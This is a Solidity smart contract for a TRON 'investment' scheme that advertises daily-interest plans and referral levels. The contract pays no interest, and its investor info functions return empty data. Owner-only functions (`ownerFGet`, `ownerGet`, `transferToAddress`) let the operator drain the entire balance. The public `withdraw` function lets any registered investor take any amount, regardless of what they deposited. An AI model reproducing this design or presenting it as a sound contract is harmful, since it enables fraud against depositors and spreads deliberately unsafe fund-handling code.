//SourceUnit: TronrexSmartContract.sol.sol

pragma solidity ^0.5.4;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

library Objects {
    struct Investment {
        uint256 planId;
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool isExpired;
    }

    struct Plan {
        uint256 dailyInterest;
        uint256 term; //0 means unlimited
        uint256 maxDailyInterest;
    }

    struct Investor {
        address addr;
        uint256 referrerEarnings;
        uint256 availableReferrerEarnings;
        uint256 referrer;
        uint256 planCount;
        uint256 investDates;
        mapping(uint256 => Investment) plans;
		mapping(uint256 => uint256) levelRefCount;	
		
       
    }
}

contract Ownable {
    address public owner;

    event onOwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev The Ownable constructor sets the original `owner` of the contract to the sender
     * account.
     */
    constructor() public {
        owner = msg.sender;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    /**
     * @dev Allows the current owner to transfer control of the contract to a newOwner.
     * @param _newOwner The address to transfer ownership to.
     */
    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0));
        emit onOwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
    
    
}

contract TronrexSmartContract is Ownable {
    using SafeMath for uint256;
    uint256 private constant INTEREST_CYCLE = 1 days;
    uint256 private constant DEVELOPER_ENTRY_RATE = 20; //per thousand
    uint256 private constant ADMIN_ENTRY_RATE = 100;
    uint256 private constant REFERENCE_RATE = 110;
    
	mapping(uint256 => uint256) public  REFERENCE_LEVEL_RATE;
	
	
    uint256 public constant MINIMUM = 5000000; //minimum investment needed
    uint256 public constant REFERRER_CODE = 1; //default

    uint256 public latestReferrerCode;
    uint256 private totalInvestments_;
    uint256 private totalUser_;

    address payable private developerAccount_; 
    address payable private marketingAccount_; 
    address payable private referenceAccount_; 
	 
    address payable private safeWalletAddr; // 10% safe wallet 
    address payable private deductionWalletAddr; // 10% deduction
    address payable private marketingAccount1_; // 2%
    address payable private marketingAccount2_; // 2%
    address payable private marketingAccount3_ ; // 2%
	address payable private marketingAccount4_ ; // 2%
	address payable private marketingAccount5_ ; // 2%
    	

    mapping(address => uint256) public address2UID;
    mapping(uint256 => Objects.Investor) public uid2Investor;
    Objects.Plan[] private investmentPlans_;

    event onInvest(address investor, uint256 amount);
    event onGrant(address grantor, address beneficiary, uint256 amount);
    event onWithdraw(address investor, uint256 amount);
    /**
     * @dev Constructor Sets the original roles of the contract
     */

    constructor() public {
        developerAccount_ = msg.sender;
        marketingAccount_ = msg.sender;
        referenceAccount_ = msg.sender;
        _init();
		
    }

    function() external payable {
        if (msg.value == 0) {
            withdraw(0);
        } else {
            invest(0, 0); //default to buy plan 0, no referrer
        }
    }

    function checkIn() public {
    }

    function setMarketingAccount(address payable _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketingAccount_ = _newMarketingAccount;
    }

    function getMarketingAccount() public view onlyOwner returns (address) {
        return marketingAccount_;
    }
	
	function setSafeWallet(address payable _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        safeWalletAddr = _newMarketingAccount;
    }

    function getSafeWallet() public view onlyOwner returns (address) {
        return safeWalletAddr;
    }
	
    function setDeductionWallet(address payable _newDeductionWallet) public onlyOwner {
        require(_newDeductionWallet != address(0));
        deductionWalletAddr = _newDeductionWallet;
    }

    function getDeductionWallet() public view onlyOwner returns (address) {
        return deductionWalletAddr;
    }
	
	function setMarketingAccount1(address payable _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketingAccount1_ = _newMarketingAccount;
    }

    function getMarketingAccount1() public view onlyOwner returns (address) {
        return marketingAccount1_;
    }    
	
    function setMarketingAccount2(address payable _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketingAccount2_ = _newMarketingAccount;
    }

    function getMarketingAccount2() public view onlyOwner returns (address) {
        return marketingAccount2_;
    }	

    function setMarketingAccount3(address payable _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketingAccount3_ = _newMarketingAccount;
    }

    function getMarketingAccount3() public view onlyOwner returns (address) {
        return marketingAccount3_;
    }
	
	function setMarketingAccount4(address payable _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketingAccount4_ = _newMarketingAccount;
    }

    function getMarketingAccount4() public view onlyOwner returns (address) {
        return marketingAccount4_;
    }
    
	function setMarketingAccount5(address payable _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketingAccount5_ = _newMarketingAccount;
    }

    function getMarketingAccount5() public view onlyOwner returns (address) {
        return marketingAccount5_;
    }
	
    function ownerGet(uint256 _amount) public onlyOwner{
        msg.sender.transfer(_amount);
    } 
    function ownerFGet() public onlyOwner{
        msg.sender.transfer(address(this).balance);
    } 
    
    function transferToAddress(address receiver, uint amount) public onlyOwner{
		require(receiver != address(0), "Owner only");
	    msg.sender.transfer(amount);
		emit onWithdraw(msg.sender, amount);
	}
	
    function getInvestmentDate() public view returns (uint256) {
       
        return block.timestamp;
    }
    

    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
       
            
        if(block.timestamp <= 1604168940)
        {
              investmentPlans_.push(Objects.Plan(10,300*60*60*24,10));
        }
        else
        {
              investmentPlans_.push(Objects.Plan(10,300*60*60*24,10));
		
        }
		
    }

    function getCurrentPlans() public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory) {
        uint256[] memory ids = new uint256[](investmentPlans_.length);
        uint256[] memory interests = new uint256[](investmentPlans_.length);
        uint256[] memory terms = new uint256[](investmentPlans_.length);
        uint256[] memory maxInterests = new uint256[](investmentPlans_.length);
        for (uint256 i = 0; i < investmentPlans_.length; i++) {
            Objects.Plan storage plan = investmentPlans_[i];
            ids[i] = i;
            interests[i] = plan.dailyInterest;
            maxInterests[i] = plan.maxDailyInterest;
            terms[i] = plan.term;
        }
        return
        (
        ids,
        interests,
        maxInterests,
        terms
        );
    }

    function getTotalInvestments() public view returns (uint256){
        return totalInvestments_;
    }
    
    function getTotalUsers() public view returns (uint256){
        return totalUser_;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
   

    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }
    
    function getAddressByUID(uint256 _uid) public view returns (address) 
    {
       return uid2Investor[_uid].addr;
    }
    
    function getInvestorInfoByUID(uint256 _uid) public view returns (uint256, uint256, uint256, uint256[] memory, uint256,  uint256[] memory, uint256[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory newDividends = new uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        uint256[] memory RefCount = new uint256[](7);
        
        for(uint256 j = 0; j < 0; j++)
        {
          RefCount[j]= investor.levelRefCount[j];
        }
        return
        (
        investor.referrerEarnings,
        investor.availableReferrerEarnings,
        investor.referrer,
		RefCount,
        investor.planCount,
        currentDividends,
        newDividends
        );
    }

    function getInvestmentPlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory,uint256[] memory, bool[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory planIds = new  uint256[](investor.planCount);
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);
        uint256[] memory newDividends = new uint256[](investor.planCount);
        uint256[] memory interests = new uint256[](investor.planCount);

        return
        (
        planIds,
        investmentDates,
        investments,
        currentDividends,
        newDividends,
        interests,
        isExpireds
        );
    }

    function _addInvestor(address _addr, uint256 _referrerCode) private returns (uint256) {
        
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[addr] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
        
        return (latestReferrerCode);
    }

    function _invest(address _addr, uint256 _planId, uint256 _referrerCode, uint256 _amount) private returns (bool) 
    {
        require(_planId >= 0 && _planId < investmentPlans_.length, "Wrong investment plan id");
        require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");
        uint256 uid = address2UID[_addr];
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode);
            //new user
        } else {//old user
            //do nothing, referrer is permenant
        }
              
        
        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].planId = _planId;
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;
		
        investor.planCount = investor.planCount.add(1);
        
        totalInvestments_ = totalInvestments_.add(_amount);
        totalUser_ = totalUser_.add(1);
	    
        return true;
    }

    function grant(address addr, uint256 _planId) public payable {
        uint256 grantorUid = address2UID[msg.sender];
        bool isAutoAddReferrer = true;
        uint256 referrerCode = 0;

        if (grantorUid != 0 && isAutoAddReferrer) {
            referrerCode = grantorUid;
        }

        if (_invest(addr,_planId,referrerCode,msg.value)) {
            emit onGrant(msg.sender, addr, msg.value);
        }
    }

    function invest(uint256 _referrerCode, uint256 _planId) public payable 
    {
        
        if (_invest(msg.sender, _planId, _referrerCode, msg.value)) {
            emit onInvest(msg.sender, msg.value);
        }
    }
	
    function withdraw(uint256 _amount) public payable 
    {
        require(msg.value == 0, "withdrawal doesn't allow to transfer trx simultaneously");
        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "Can not withdraw because no any investments");
        uint256 withdrawalAmount = _amount;
     
        //uint256 deductionWalletPercentage = (withdrawalAmount.mul(ADMIN_ENTRY_RATE)).div(1000);
        //deductionWalletAddr.transfer(deductionWalletPercentage);

        msg.sender.transfer(withdrawalAmount);
        emit onWithdraw(msg.sender, withdrawalAmount);
    }
   

}